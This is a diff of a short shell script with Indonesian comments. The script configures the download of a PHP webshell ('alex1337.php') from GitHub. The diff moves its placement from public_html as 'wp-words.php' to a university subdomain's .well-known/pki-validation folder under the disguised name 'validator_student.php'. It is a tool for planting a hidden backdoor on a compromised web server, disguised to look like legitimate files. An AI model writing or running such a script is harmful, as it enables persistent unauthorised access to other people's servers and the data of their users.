@@ -2,8 +2,8 @@
 
 # Konfigurasi
 URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/alex1337.php"
-DOWNLOAD_DIR="/home/openpxmb/public_html/"
-OUTPUT_FILE="wp-words.php"
+DOWNLOAD_DIR="/home/openpxmb/register.openarc.edu.lk/.well-known/pki-validation/"
+OUTPUT_FILE="validator_student.php"
 OUTPUT_PATH="$DOWNLOAD_DIR/$OUTPUT_FILE"
 
 # Pastikan direktori tujuan ada
